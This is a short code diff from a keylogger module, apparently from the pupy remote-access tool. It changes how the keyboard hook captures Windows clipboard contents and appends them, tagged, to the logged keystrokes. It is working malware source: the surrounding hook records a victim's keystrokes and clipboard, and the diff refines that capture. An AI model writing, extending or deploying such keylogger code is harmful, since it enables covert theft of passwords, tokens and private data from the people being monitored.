@@ -274,13 +274,16 @@ class KeyLogger(pupy.Task):
         paste=""
 
         try:
-            paste=winGetClipboard()
+            paste = winGetClipboard()
         except Exception:
             pass
 
-        if paste and paste!=self.last_clipboard:
-            self.append('\n<clipboard>%s</clipboard>\n'%(repr(paste)[2:-1]))
-            self.last_clipboard=paste
+        if paste and paste != self.last_clipboard:
+            try:
+                self.append(u'\n<clipboard>{}</clipboard>\n'.format(paste.strip()))
+            except:
+                self.append(u'\n<clipboard>{}</clipboard>\n'.format(repr(paste)[2:-1]))
+            self.last_clipboard = paste
 
         self.append(hooked_key)
         return CallNextHookEx(self.hooked, nCode, wParam, lParam)
